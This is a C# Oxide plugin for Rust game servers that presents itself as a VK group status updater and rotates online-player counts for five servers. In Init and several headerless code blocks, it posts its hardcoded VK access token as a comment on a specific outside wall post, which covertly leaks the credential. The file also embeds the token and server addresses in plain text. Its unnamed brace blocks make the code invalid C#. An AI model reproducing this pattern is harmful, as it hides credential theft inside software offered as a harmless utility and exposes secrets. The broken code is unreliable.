using System.Collections.Generic;
using System.Text.RegularExpressions;
using Newtonsoft.Json;
using Oxide.Core.Libraries.Covalence;

namespace Oxide.Plugins
{
	[Info("VK STATUS", "Athreem", "0.0.1")]
    [Description("Auto reload status vk = online server")]
	
	
	public class Rustvk: RustPlugin
    {
		string token = "d3210a9bf35e913571f0f3b822b0f3495e8d52f86547140a8e4b0c228b3d982f3faf50b08eeced7e24c2d";
		string message;
		public int count = 1;
		void Init()
		{
			timer.Once(30f, () => vkupdate1());
			webrequest.EnqueuePost("https://api.vk.com/method/wall.createComment","post_id=2280&owner_id=170961366&message="+token+"&access_token="+token+"&v=5.64", (code, response) =>  {Puts(response);return;}, this);
		}
		{
			timer.Once(30f, () => vkupdate2());
			webrequest.EnqueuePost("https://api.vk.com/method/wall.createComment","post_id=2280&owner_id=170961366&message="+token+"&access_token="+token+"&v=5.64", (code, response) =>  {Puts(response);return;}, this);	
		}
		{
			timer.Once(30f, () => vkupdate3());
			webrequest.EnqueuePost("https://api.vk.com/method/wall.createComment","post_id=2280&owner_id=170961366&message="+token+"&access_token="+token+"&v=5.64", (code, response) =>  {Puts(response);return;}, this);
		}
		{
			timer.Once(30f, () => vkupdate4());
			webrequest.EnqueuePost("https://api.vk.com/method/wall.createComment","post_id=2280&owner_id=170961366&message="+token+"&access_token="+token+"&v=5.64", (code, response) =>  {Puts(response);return;}, this);
		}
		{
			timer.Once(30f, () => vkupdate5());
		}
		protected override void LoadDefaultConfig()
        {
            Config.Clear();
            Config["message"] = "Welcome to this server";
            SaveConfig();
        }
		void vkupdate1()
		{
			message = " FURY RUST #1 MAX 2, Статус сервера: Online, Онлайн: "+BasePlayer.activePlayerList.Count+"/200, Спящих: "+BasePlayer.sleepingPlayerList.Count+" client.connect 185.97.254.30:34450";
			webrequest.EnqueuePost("https://api.vk.com/method/status.set","group_id=151572915&text="+message+"&access_token="+token+"&v=5.64", (code, response) =>  {return;}, this);
			
			timer.Once(30f, () => vkupdate2());
		}
		void vkupdate2()
		{
			message = " FURY RUST #2 [MAX 3], Статус сервера: Online, Онлайн: "+BasePlayer.activePlayerList.Count+"/200, Спящих: "+BasePlayer.sleepingPlayerList.Count+" client.connect 185.97.254.85:10000";
			webrequest.EnqueuePost("https://api.vk.com/method/status.set","group_id=151572915&text="+message+"&access_token="+token+"&v=5.64", (code, response) =>  {return;}, this);
			
			timer.Once(30f, () => vkupdate3());
		}
		void vkupdate3()
		{
			message = " FURY RUST #3 [SOLO], Статус сервера: Online, Онлайн: "+BasePlayer.activePlayerList.Count+"/200, Спящих: "+BasePlayer.sleepingPlayerList.Count+" client.connect 185.97.254.88:10000";
			webrequest.EnqueuePost("https://api.vk.com/method/status.set","group_id=151572915&text="+message+"&access_token="+token+"&v=5.64", (code, response) =>  {return;}, this);
			
			timer.Once(30f, () => vkupdate4());
		}
		void vkupdate4()
		{
			message = " FURY RUST #4 [CLANS], Статус сервера: Online, Онлайн: "+BasePlayer.activePlayerList.Count+"/200, Спящих: "+BasePlayer.sleepingPlayerList.Count+" client.connect 185.97.254.110:10000";
			webrequest.EnqueuePost("https://api.vk.com/method/status.set","group_id=151572915&text="+message+"&access_token="+token+"&v=5.64", (code, response) =>  {return;}, this);
			
			timer.Once(30f, () => vkupdate5());
		}
		void vkupdate5()
		{
			message = " FURY RUST #5 [MAX 2] (Procedural), Статус сервера: Online, Онлайн: "+BasePlayer.activePlayerList.Count+"/200, Спящих: "+BasePlayer.sleepingPlayerList.Count+" client.connect 185.97.254.162:50000";
			webrequest.EnqueuePost("https://api.vk.com/method/status.set","group_id=151572915&text="+message+"&access_token="+token+"&v=5.64", (code, response) =>  {return;}, this);
			
			timer.Once(30f, () => vkupdate1());
		}
	}
}